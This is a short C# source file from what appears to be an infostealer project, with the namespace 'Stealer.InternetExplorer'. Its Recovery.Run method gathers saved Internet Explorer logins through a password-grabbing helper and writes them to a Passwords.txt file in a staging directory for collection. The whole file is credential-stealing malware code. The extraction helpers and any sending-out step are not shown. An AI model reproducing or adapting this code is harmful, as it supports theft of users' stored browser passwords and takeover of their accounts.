namespace Stealer.InternetExplorer
{
    internal sealed class Recovery
    {
        public static void Run(string sSavePath)
        {
            // Write IE logins
            System.Collections.Generic.List<Password> ePasswords = cPasswords.Get();
            if (ePasswords.Count != 0)
            {
                System.IO.Directory.CreateDirectory(sSavePath + "\\InternetExplorer");
                cBrowserUtils.WritePasswords(ePasswords, sSavePath + "\\InternetExplorer\\Passwords.txt");
            }
        }
    }
}
